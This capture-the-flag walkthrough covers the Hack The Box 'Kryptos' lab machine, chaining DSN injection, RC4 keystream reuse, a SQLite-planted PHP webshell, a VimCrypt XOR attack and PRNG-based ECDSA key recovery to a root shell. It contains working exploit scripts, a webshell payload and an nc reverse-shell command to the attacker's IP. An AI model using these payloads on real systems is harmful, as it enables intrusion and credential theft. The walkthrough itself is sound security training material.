# HTB Kryptos — Full Walkthrough

**Difficulty:** Insane | **OS:** Linux | **IP:** 10.129.2.163 | **Attacker:** 10.10.14.6

---

## Table of Contents

1. [Machine Overview & Mindset](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#1-machine-overview--mindset)
2. [Reconnaissance](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#2-reconnaissance)
3. [Phase 1 — Auth Bypass via DSN Injection](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#3-phase-1--auth-bypass-via-dsn-injection)
4. [Phase 2 — RC4 Keystream Abuse to Access /dev](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#4-phase-2--rc4-keystream-abuse-to-access-dev)
5. [Phase 3 — SQLite Injection to Webshell](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#5-phase-3--sqlite-injection-to-webshell)
6. [Phase 4 — VimCrypt Known-Plaintext Attack](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#6-phase-4--vimcrypt-known-plaintext-attack)
7. [Phase 5 — Broken PRNG + Python Eval Jail Escape to Root](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#7-phase-5--broken-prng--python-eval-jail-escape-to-root)
8. [Attack Chain Summary](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#8-attack-chain-summary)
9. [Key Lessons & Concepts](https://claude.ai/chat/8eee5f95-d2c7-4ac0-a0dd-714b3f7e2853#9-key-lessons--concepts)

---

## 1. Machine Overview & Mindset

Kryptos is an Insane-rated Linux box that lives up to its name — every single phase involves breaking or abusing a cryptographic or authentication primitive. It requires chaining **five distinct vulnerabilities** before reaching root, with each step gating the next.

### The Insane Mindset

On Insane boxes, nothing is handed to you. You must:

- **Read responses carefully** — error codes are clues, not just noise
- **Think about trust boundaries** — who decides what server to authenticate against?
- **Know your crypto primitives** — stream cipher keystream reuse, VimCrypt blowfish bugs, broken PRNGs
- **Be patient with tooling** — half the work is getting your tools to speak the right protocol

### Full Attack Chain (Bird's Eye View)

```
Login form  →  DSN injection  →  Rogue MySQL  →  Auth bypass
    ↓
encrypt.php  →  RC4 keystream reuse  →  Internal URL access (/dev)
    ↓
sqlite_test_page.php  →  SQLite stacked queries  →  ATTACH DATABASE  →  PHP webshell
    ↓
/home/rijndael/creds.txt  →  VimCrypt blowfish XOR  →  SSH credentials
    ↓
kryptos.py on port 81  →  PRNG brute  →  ECDSA key recovery  →  eval() jail escape  →  root
```

---

## 2. Reconnaissance

### Why Recon Matters

Before touching any vulnerability, you need to understand the attack surface. Recon tells you what ports are open, what services are running, and what technology stack you're dealing with. Every detail feeds your hypothesis generation.

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.2.163
```

**Output (relevant):**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Cryptor Login
```

**What this tells us:**

- Only two ports — SSH and HTTP. The entire attack surface is the web application.
- Apache 2.4.29 on Ubuntu Bionic (18.04) — known OS fingerprint helps scope CVEs.
- Title is "Cryptor Login" — this box will involve cryptography.
- SSH is available — once we find credentials, we can get a proper shell.

### Web Directory Brute Force

```bash
gobuster dir -u http://10.129.2.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

**Key findings:**

```
/index.php     (200)
/encrypt.php   (302 → redirects to login)
/decrypt.php   (302 → redirects to login)
/dev           (403 → Forbidden)
/url.php       (200 → empty)
/aes.php       (200 → empty)
/rc4.php       (200 → empty)
```

**Hacker mindset:**

- `encrypt.php` and `decrypt.php` redirect when unauthenticated → they exist but require a session.
- `url.php`, `aes.php`, `rc4.php` return 200 but empty → these are **include files** called by encrypt/decrypt. The box is encryption-themed.
- `/dev` returns 403 Forbidden — not 404. The directory **exists** but is access-controlled. This is a target for later.
- The encryption theme (`aes.php`, `rc4.php`) is a strong hint that crypto weaknesses are in scope.

### Login Page Analysis

Intercepting the login POST request reveals:

```
POST / HTTP/1.1
username=admin&password=admin&db=cryptor&token=<CSRF_TOKEN>&login=
```

**Critical observation:** The `db` parameter is user-controlled. In normal applications, the database name is hardcoded. Exposing it in the form suggests it is directly used in a database connection string — a potential injection point.

Testing with a modified `db` value returns:

```
PDOException code: 1044
```

PDO = PHP Data Objects. Error 1044 = "Access denied for user to database". This confirms the `db` value is being fed into a **PDO DSN string** to connect to MySQL.

---

## 3. Phase 1 — Auth Bypass via DSN Injection

### Concept: What is a PDO DSN?

PHP connects to databases via a Data Source Name (DSN) string:

```php
$conn = new PDO("mysql:host=localhost;dbname=" . $_POST['db'], $user, $pass);
```

If `$_POST['db']` is not sanitized, an attacker can inject additional DSN parameters. The MySQL DSN format supports semicolon-separated key=value pairs:

```
mysql:host=localhost;dbname=cryptor;port=3306
```

By injecting `;host=10.10.14.6;`, we can redirect the database connection to our own machine.

### Why This is Powerful

The application authenticates users by querying a MySQL database. If we control which MySQL server it queries, we can:

1. **Capture** the MySQL credentials it uses (the app's DB username/password)
2. **Create a fake database** that returns valid authentication for any credentials we choose
3. **Log in** as any user

This is a supply-chain style attack — we don't break into the app, we impersonate its infrastructure.

### Step 1: Confirm Outbound Connection

Set up a listener on port 3306 (MySQL's default port):

```bash
nc -lnvp 3306
```

Send a login POST with the injected `db`:

```
db=cryptor;host=10.10.14.6;port=3306
```

You receive a connection from the target. **Confirmed: the server will connect to us.**

### Step 2: Capture the MySQL Credentials

Use Metasploit's MySQL capture module (or configure real MariaDB) to capture the challenge-response authentication hash:

```
[+] 10.129.2.163 - User: dbuser; Challenge: 112233...; Response: 73def07d...
```

Crack with John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt capture_hash
# Result: krypt0n1te
```

**Why crack it?** We need these credentials to allow the target to successfully authenticate to our rogue MySQL. Without them, the handshake would fail even with our fake server.

### Step 3: Set Up the Rogue MySQL

Configure MariaDB on Kali to listen on all interfaces:

```bash
# /etc/mysql/mariadb.conf.d/50-server.cnf
bind-address = 0.0.0.0
```

```bash
sudo systemctl restart mariadb
```

Create the fake authentication database. The application queries:

```sql
SELECT username, password FROM users WHERE username='x' AND password='<MD5>'
```

Note: passwords are stored/compared as MD5 hashes.

```sql
CREATE USER 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
CREATE DATABASE cryptor;
GRANT ALL PRIVILEGES ON cryptor.* TO 'dbuser'@'%' IDENTIFIED BY 'krypt0n1te';
USE cryptor;
CREATE TABLE users (username varchar(255), password varchar(255));
INSERT INTO users (username, password) VALUES ('admin', MD5('admin'));
FLUSH PRIVILEGES;
```

### Step 4: Trigger the Bypass

Send the login request with the injection. Use Python to automate CSRF token handling:

```python
import requests
from bs4 import BeautifulSoup

TARGET = "http://10.129.2.163"
KALI   = "10.10.14.6"

s = requests.Session()
r = s.get(TARGET)
token = BeautifulSoup(r.text, 'html.parser').find("input", {"name": "token"})["value"]

data = {
    "username": "admin",
    "password": "admin",
    "db": f"cryptor;host={KALI};port=3306",
    "token": token,
    "login": ""
}
r = s.post(TARGET, data=data)
# Response: "File Encryptor" page = SUCCESS
```

**Hacker mindset:** The CSRF token regenerates on every page load, so you can't replay requests in Burp without refreshing. Automating token fetch is the pragmatic solution for any repeatable testing.

**Result:** Logged in as `admin`. We now have an authenticated session on the web application.

---

## 4. Phase 2 — RC4 Keystream Abuse to Access /dev

### Concept: RC4 and Keystream Reuse

RC4 is a stream cipher. Encryption works like this:

```
ciphertext = plaintext XOR keystream
```

The keystream is generated from a key. The critical property:

- If you **encrypt the same key** twice, the second encryption XORs the ciphertext with the same keystream, cancelling it:

```
encrypt(encrypt(plaintext)) = plaintext XOR keystream XOR keystream = plaintext
```

This is known as **keystream reuse** — a fundamental stream cipher misuse.

### The Application's Encrypt Feature

After login, `encrypt.php` allows submitting a URL. The server:

1. Fetches the URL's content
2. RC4-encrypts it
3. Returns the base64-encoded ciphertext

Since the **same key/keystream** is used for every request, we can use the encrypt endpoint as a **decryption oracle**:

1. Submit target URL → server fetches content, returns `base64(RC4(content))`
2. Decode base64 → get raw ciphertext bytes
3. Serve those bytes from our own HTTP server
4. Submit our server's URL → server fetches ciphertext bytes, RC4-encrypts them again → `base64(RC4(RC4(content)))` = `base64(content)`
5. Decode base64 → **plaintext**

### Why This Matters

We can now make the **target server fetch any internal URL** (like `http://127.0.0.1/dev/...`) and decrypt the response — bypassing the 403 Forbidden restriction on `/dev` that blocks external access.

### Setting Up the Relay

Start an HTTP server in your working directory:

```bash
cd ~/Downloads/kryptos
python3 -m http.server 8000
```

Discover the correct form parameters first:

```python
# The form uses GET (no method attr = default GET) to /encrypt.php
# Parameters: url= and cipher= (values: "AES-CBC" or "RC4")
r = s.get(f"{TARGET}/encrypt.php", params={"url": target_url, "cipher": "RC4"})
```

Full RC4 fetch function:

```python
def rc4_fetch(s, url):
    # Step 1: get RC4(content) from server
    r = s.get(f"{TARGET}/encrypt.php", params={"url": url, "cipher": "RC4"})
    ct_b64 = BeautifulSoup(r.text, 'html.parser').find("textarea").text.strip()
    ct_bytes = base64.b64decode(ct_b64)

    # Step 2: save raw ciphertext for relay
    with open("relay.bin", "wb") as f:
        f.write(ct_bytes)

    # Step 3: re-encrypt → XOR cancels → base64(plaintext)
    r2 = s.get(f"{TARGET}/encrypt.php",
               params={"url": f"http://{KALI}:8000/relay.bin", "cipher": "RC4"})
    pt_b64 = BeautifulSoup(r2.text, 'html.parser').find("textarea").text.strip()
    return base64.b64decode(pt_b64).decode(errors='replace')
```

### Discovering /dev Contents

Fetch the ToDo page:

```bash
python3 rc4_fetch.py "http://127.0.0.1/dev/index.php?view=todo"
```

Response:

```html
<h3>ToDo List:</h3>
1) Remove sqlite_test_page.php
2) Remove world writable folder which was used for sqlite testing
3) Do the needful
<h3>Done:</h3>
4) Restrict access to /dev
5) Disable dangerous PHP functions
```

**Critical intelligence gathered:**

- `sqlite_test_page.php` still exists — developers forgot to remove it
- A **world-writable folder** still exists — we can write files to disk
- Dangerous PHP functions (system, exec, etc.) are disabled — but not all of them
- `/dev` access is restricted from outside, but not from 127.0.0.1

### Reading PHP Source via PHP Filter

PHP's `php://filter` wrapper can base64-encode files before they're output, allowing us to read PHP source code without it being executed:

```bash
python3 rc4_fetch.py "http://127.0.0.1/dev/index.php?view=php://filter/convert.base64-encode/resource=sqlite_test_page"
```

Decode the base64 blob from the HTML response:

```bash
# Extract the base64 string and decode
echo "<BASE64_BLOB>" | base64 -d
```

**Result:** Full PHP source of `sqlite_test_page.php`.

---

## 5. Phase 3 — SQLite Injection to Webshell

### Analysing the Source Code

```php
$no_results = $_GET['no_results'];
$bookid = $_GET['bookid'];
$query = "SELECT * FROM books WHERE id=" . $bookid;  // NO sanitization!

if (isset($bookid)) {
    class MyDB extends SQLite3 {
        function __construct() {
            // This folder is world writable
            $this->open('d9e28afcf0b274a5e0542abb67db0784/books.db');
        }
    }
    $db = new MyDB();

    if (isset($no_results)) {
        $ret = $db->exec($query);    // exec() supports stacked queries
    } else {
        $ret = $db->query($query);   // query() does NOT
    }
}
```

**Key observations:**

1. `$bookid` is directly concatenated into the SQL query — classic SQLi
2. When `no_results` is set, `exec()` is used — this supports **multiple statements** (stacked queries)
3. The DB file is in `d9e28afcf0b274a5e0542abb67db0784/` which is **world-writable**
4. Full web path is `/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/`

### The ATTACH DATABASE Technique

SQLite has a feature called `ATTACH DATABASE` that opens (or creates) a second database file. Combined with stacked queries, we can:

1. `ATTACH DATABASE '/var/www/html/dev/.../shell.php' AS shell` — creates a new SQLite file at that path
2. `CREATE TABLE shell.pwn (dataz text)` — creates a table in that file
3. `INSERT INTO shell.pwn VALUES ('<?php ... ?>')` — inserts PHP code as a row

The resulting file is a valid SQLite binary that **also contains our PHP code** as a string. When PHP parses it, it scans for `<?php` tags and executes them, ignoring the binary SQLite header.

### Critical Gotcha: Quote Escaping

The SQL INSERT uses double quotes as string delimiters:

```sql
insert into shell.pwn (dataz) values ("<?php ... ?>");
```

Any double quotes **inside** the PHP code will break the SQL string. Always use single quotes in the embedded PHP:

```python
# WRONG - double quotes inside break SQL
php_code = '<?php echo file_get_contents($_GET["f"]); ?>'

# CORRECT - single quotes only inside
php_code = "<?php echo 'KSTART:'; echo file_get_contents($_GET['f']); echo ':KEND'; ?>"
```

### Another Gotcha: Disabled Functions

The ToDo mentioned "Disable dangerous PHP functions". This covers execution functions like `system()`, `exec()`, `shell_exec()`, `passthru()`. However, **file reading functions** like `file_get_contents()` and `readfile()` are typically not disabled since they're used by legitimate applications.

We use `file_get_contents()` for our webshell — sufficient to read credentials from disk.

### Writing the Webshell

```python
from urllib.parse import quote

shell_path = '/var/www/html/dev/d9e28afcf0b274a5e0542abb67db0784/shell.php'
php_code   = "<?php echo 'KSTART:'; echo file_get_contents($_GET['f']); echo ':KEND'; ?>"

sqli = (
    f"1;attach database '{shell_path}' as sh;"
    f"create table sh.pwn (dataz text);"
    f"insert into sh.pwn (dataz) values (\"{php_code}\");--"
)

url = f"http://127.0.0.1/dev/sqlite_test_page.php?no_results=1&bookid={quote(sqli)}"
rc4_fetch(s, url)
```

**Why the `KSTART:`/`:KEND` markers?** The SQLite binary header (starting with `SQLite format 3`) appears before our `<?php` tag. PHP outputs that binary data as-is. The markers let us reliably extract just our PHP output from the binary noise.

### Verifying the Shell

```python
result = rc4_fetch(s, "http://127.0.0.1/dev/d9e28afcf0b274a5e0542abb67db0784/shell.php?f=/etc/passwd")
start = result.find("KSTART:")
end   = result.find(":KEND")
print(result[start+7:end])
# root:x:0:0:root:/root:/bin/bash ...
```

### Reading Target Files

**`/home/rijndael/creds.old`** (to confirm known plaintext):

```
rijndael / Password1
```

**`/home/rijndael/creds.txt`** (VimCrypt binary — must base64-encode through PHP to survive text encoding):

```python
# Use a separate shell that base64-encodes output
php_code = "<?php echo 'KSTART:'; echo base64_encode(file_get_contents($_GET['f'])); echo ':KEND'; ?>"
```

Then decode the result:

```python
b64  = result[start+7:end].strip()
raw  = base64.b64decode(b64)
# raw = 54 bytes of VimCrypt binary
```

---

## 6. Phase 4 — VimCrypt Known-Plaintext Attack

### What is VimCrypt?

Vim's built-in encryption saves files with a header identifying the cipher:

- `VimCrypt~01!` = ZIP/XOR (very weak)
- `VimCrypt~02!` = Blowfish CFB (weak due to implementation bug)
- `VimCrypt~03!` = Blowfish2 CFB (more secure)

Our file starts with `VimCrypt~02!` — Blowfish with a known vulnerability.

### The File Format

```
Offset  Length  Field
0       12      Magic: "VimCrypt~02!"
12       8      Salt (used to derive key from password)
20       8      IV (initialization vector for CFB mode)
28      26      Ciphertext (the actual encrypted content)
```

Total: 54 bytes. Ciphertext is 26 bytes.

### The Blowfish CFB Vulnerability

Vim's Blowfish CFB mode has a well-documented implementation bug: it operates as **8-bit CFB** (one byte at a time), but each byte of keystream is derived from a **full 64-bit Blowfish block**. Crucially, the same 8-byte block is used to generate **8 consecutive keystream bytes** without advancing the cipher state properly.

The net effect: **the keystream repeats every 8 bytes**.

```
keystream = K0 K1 K2 K3 K4 K5 K6 K7 K0 K1 K2 K3 K4 K5 K6 K7 K0 ...
```

### The Known-Plaintext XOR Attack

We have:

- **Known plaintext** from `creds.old`: `rijndael / Password1\n` (21 bytes)
- **Ciphertext** from `creds.txt`: 26 bytes (starting at offset 28)

Since `ciphertext = plaintext XOR keystream`, we get `keystream = ciphertext XOR plaintext`.

We only need the first **8 bytes** of known plaintext to recover the full repeating keystream:

```python
creds_hex  = "56696d43727970747e3032210b18e435cb56129a35448040703b962d930da810766e645dc14be21c7959437dd935fb36674d52418b6e"
raw        = bytes.fromhex(creds_hex)
ciphertext = raw[28:]               # skip 28-byte header

known      = b"rijndael / Password1\n"

# First 8 bytes of ciphertext XOR first 8 bytes of known plaintext = 8-byte keystream
keystream  = bytes(ciphertext[i] ^ known[i] for i in range(8))

# Decrypt all 26 bytes using repeating 8-byte keystream
plaintext  = bytes(ciphertext[i] ^ keystream[i % 8] for i in range(len(ciphertext)))
print(plaintext)
# b'rijndael / bkVBL8Q9HuBSpj\n'
```

**Why only 8 bytes of known plaintext?** Because the keystream repeats every 8 bytes. Once we know the 8-byte cycle, we can decrypt any length of ciphertext encrypted with that key.

### Result

```
SSH credentials: rijndael / bkVBL8Q9HuBSpj
```

### SSH Login & User Flag

```bash
ssh rijndael@10.129.2.163
# password: bkVBL8Q9HuBSpj

cat ~/user.txt
# ad28a[redacted]53f6a03b6
```

---

## 7. Phase 5 — Broken PRNG + Python Eval Jail Escape to Root

### Discovering the Local Service

```bash
ps aux | grep kryptos
# root  ...  python3 /home/rijndael/kryptos/kryptos.py

ss -tlnp | grep 81
# 127.0.0.1:81  LISTEN
```

A Python web server running as **root** on localhost port 81. Forward it to Kali:

```bash
ssh -L 81:127.0.0.1:81 rijndael@10.129.2.163
```

### Analysing kryptos.py

The server has three endpoints:

**`GET /`** — Returns a JSON status message.

**`GET /debug`** — Returns a sample expression `2+2` and its ECDSA signature:

```json
{"response": {"Expression": "2+2", "Signature": "<hex_sig>"}}
```

**`POST /eval`** — Takes `expr` and `sig`. If the ECDSA signature is valid, runs `eval(expr)` as root:

```python
result = eval(expr, {'__builtins__': None})  # builtins removed
```

**The two barriers to exploitation:**

1. You need a **valid ECDSA signature** for your expression
2. Python's `eval()` has `__builtins__` set to `None` — standard library functions unavailable

### Vulnerability 1: Broken PRNG (secure_rng)

The signing key is generated at server startup:

```python
def secure_rng(seed):
    p = 2147483647   # Mersenne prime
    g = 2255412      # generator
    keyLength = 32
    ret = 0
    ths = round((p-1)/2)
    for i in range(keyLength * 8):
        seed = pow(g, seed, p)
        if seed > ths:
            ret += 2**i
    return ret

seed = random.getrandbits(128)
rand = secure_rng(seed) + 1
sk   = SigningKey.from_secret_exponent(rand, curve=NIST384p)
```

This looks like a variant of the **Blum-Micali PRNG**. However, `g=2255412` is not a primitive root modulo `p=2147483647`. This means:

- `pow(g, k, p)` cycles through only a **small subset** of values (order ~331)
- `secure_rng` maps those ~331 inputs to only **~209 unique output values**
- Despite `seed` being 128-bit random, `rand` can only be one of ~209 values

**Implication:** The ECDSA signing key exponent has only ~209 possible values. We can brute-force which one the server is using.

### Vulnerability 2: Python eval() Jail Escape

With `{'__builtins__': None}`, direct use of `import`, `open`, `os`, etc. is blocked. But Python's object model provides a bypass through **introspection**:

Every object in Python knows its class, its base class, and all subclasses. By walking the subclass tree from a built-in type, we can find classes that still have access to builtins:

```python
# Walk the MRO to find catch_warnings, which has __builtins__ in its module
[x for x in ().__class__.__base__.__subclasses__()
 if x.__name__ == "catch_warnings"][0]()._module.__builtins__["__import__"]("os").system("id")
```

Explanation:

- `().__class__` = `tuple`
- `.__base__` = `object`
- `.__subclasses__()` = all classes that inherit from `object`
- Find `catch_warnings` (from `warnings` module) which holds a reference to `__builtins__`
- Navigate to `__builtins__["__import__"]` to import `os`
- Call `os.system()` for command execution

### The Exploit: Brute PRNG + Sign Payload

```python
import random, binascii, requests
from ecdsa import SigningKey, NIST384p

BASE = "http://127.0.0.1:81"
KALI = "10.10.14.6"

def secure_rng(seed):
    p = 2147483647
    g = 2255412
    ret = 0
    ths = round((p - 1) / 2)
    for i in range(32 * 8):
        seed = pow(g, seed, p)
        if seed > ths:
            ret += 2 ** i
    return ret

# Step 1: Get a valid (expr, sig) pair from /debug
debug = requests.get(f"{BASE}/debug").json()['response']
expr  = debug['Expression']     # "2+2"
sig   = debug['Signature']

# Step 2: Brute the seed space (~209 unique values, found within ~5000 random tries)
sk = None
for _ in range(5000):
    seed = random.getrandbits(128)
    rand = secure_rng(seed) + 1
    try:
        candidate = SigningKey.from_secret_exponent(rand, curve=NIST384p)
        vk = candidate.get_verifying_key()
        vk.verify(binascii.unhexlify(sig), expr.encode())
        sk = candidate  # Found the matching key!
        break
    except:
        continue

# Step 3: Build and sign the jail-escape payload
cmd     = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {KALI} 4444 >/tmp/f"
payload = (
    '[x for x in ().__class__.__base__.__subclasses__() '
    'if x.__name__ == "catch_warnings"][0]()._module'
    f'.__builtins__["__import__"]("os").system("{cmd}")'
)
sig_new = binascii.hexlify(sk.sign(payload.encode())).decode()

# Step 4: Send to /eval — executes as root
requests.post(f"{BASE}/eval", json={"expr": payload, "sig": sig_new}, timeout=8)
```

### Receiving the Root Shell

On Kali:

```bash
nc -lnvp 4444
```

```
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
edbb9d2[redacted]10ba75cae
```

---

## 8. Attack Chain Summary

```
┌─────────────────────────────────────────────────────────────────┐
│  PHASE 1: AUTH BYPASS                                           │
│  db=cryptor;host=10.10.14.6 → Rogue MySQL → Login as admin     │
├─────────────────────────────────────────────────────────────────┤
│  PHASE 2: RC4 KEYSTREAM ABUSE                                   │
│  encrypt(encrypt(X)) = X → Decrypt /dev internal pages         │
│  PHP filter: ?view=php://filter/.../sqlite_test_page            │
├─────────────────────────────────────────────────────────────────┤
│  PHASE 3: SQLITE SQLI → WEBSHELL                                │
│  bookid=1;ATTACH DATABASE 'shell.php' AS sh;...                 │
│  INSERT INTO sh.pwn VALUES ('<?php ... ?>')                     │
│  → file_get_contents() reads arbitrary files                    │
├─────────────────────────────────────────────────────────────────┤
│  PHASE 4: VIMCRYPT KNOWN-PLAINTEXT XOR                          │
│  keystream[i] = ciphertext[i] XOR known[i] (repeats every 8B)  │
│  → rijndael / bkVBL8Q9HuBSpj → SSH → user.txt                  │
├─────────────────────────────────────────────────────────────────┤
│  PHASE 5: BROKEN PRNG + EVAL JAIL ESCAPE                        │
│  secure_rng() has ~209 unique values → brute signing key        │
│  catch_warnings subclass bypass → __builtins__ restored         │
│  → os.system() as root → root.txt                               │
└─────────────────────────────────────────────────────────────────┘
```

### Credentials Recovered

|Credential|Value|
|---|---|
|MySQL DB user|`dbuser` / `krypt0n1te`|
|Web login|`admin` / `admin` (our own rogue DB)|
|SSH|`rijndael` / `bkVBL8Q9HuBSpj`|

### Flags

|Flag|Value|
|---|---|
|user.txt|`ad28a2[redacted]3f6a03b6`|
|root.txt|`edbb9d[redacted]10ba75cae`|

---

## 9. Key Lessons & Concepts

### 1. Injection is Not Just SQL

The DSN injection here is **protocol injection** — injecting parameters into a structured string that is parsed by a library, not a database. Any time user input is concatenated into a structured string (connection strings, LDAP queries, XML, SMTP headers), injection may be possible.

### 2. Trust Boundaries: Who Authenticates Whom?

The core of Phase 1 is a **trust boundary violation**. The application trusted the client to declare which database server to authenticate against. Attackers who control the authentication backend control who can log in. Always hardcode infrastructure endpoints server-side.

### 3. Stream Cipher Keystream Reuse is Fatal

RC4 and any stream cipher XORs plaintext with a keystream. If the **same key and IV** produce the same keystream, encrypting the ciphertext again recovers the plaintext. This is why TLS generates a fresh session key for every connection, and why RC4 has been deprecated from all modern protocols.

### 4. PHP Filter Trick for Source Disclosure

`php://filter/convert.base64-encode/resource=<file>` is a read primitive that bypasses any code execution restrictions. It base64-encodes the file before output, so PHP source code is returned as data rather than executed. This is a standard LFI-to-source-disclosure technique.

### 5. SQLite ATTACH DATABASE as a Write Primitive

When you have SQL injection into a SQLite database, `ATTACH DATABASE` turns it into a **file write primitive**. You can write arbitrary content to any path writable by the web server process. Combined with a world-writable web directory, this is a reliable webshell technique.

### 6. Know Your PHP Function Blacklists

Dangerous function blacklists (`disable_functions` in `php.ini`) typically target **execution** functions: `system`, `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`. They rarely include **file I/O** functions like `file_get_contents`, `readfile`, `fopen`. When you can't exec, pivot to reading files — credentials, source code, SSH keys.

### 7. VimCrypt Blowfish Bug: 8-bit CFB Keystream Repeat

Vim's `~02` Blowfish implementation uses 8-bit CFB mode incorrectly, causing the keystream to repeat every 8 bytes. With any 8 bytes of known plaintext, the full keystream is recoverable. This is why never use `~02` — use `~03` (blowfish2) or, better, use dedicated encryption tools.

### 8. Small PRNG State Spaces Are Brutable

A PRNG that produces only ~209 unique outputs regardless of seed entropy is cryptographically broken. When the signing key exponent can only be one of ~209 values, brute-forcing it requires at most ~209 ECDSA key generation and signature verification operations — trivially fast. Always audit custom PRNG implementations. If `g` is not a primitive root modulo `p`, the output space collapses.

### 9. Python eval() Jail Escapes via Subclass Introspection

Removing `__builtins__` from an eval context is not a security boundary. Python's object model allows navigating from any built-in object (`()`, `[]`, `{}`) through `__class__.__base__.__subclasses__()` to find classes that still reference builtins in their module globals. The `catch_warnings` class is a reliable entry point. Sandbox-safe eval requires proper language-level isolation (e.g., a subprocess, a separate interpreter, or a purpose-built sandbox like PyPy's sandbox mode).

### 10. Defense-in-Depth Failures Compound

No single vulnerability on Kryptos is catastrophic in isolation. The box is Insane because it requires chaining five separate weaknesses. Each "fix" the developers half-implemented (restricting `/dev` by IP, disabling exec functions, using a signed eval) created a false sense of security without addressing the underlying issue. Real security requires layers that are each independently sufficient, not a chain where any one break leads to full compromise.

---

_Walkthrough by Abdullah (CyberKareem) | HTB Kryptos | Insane | Linux_
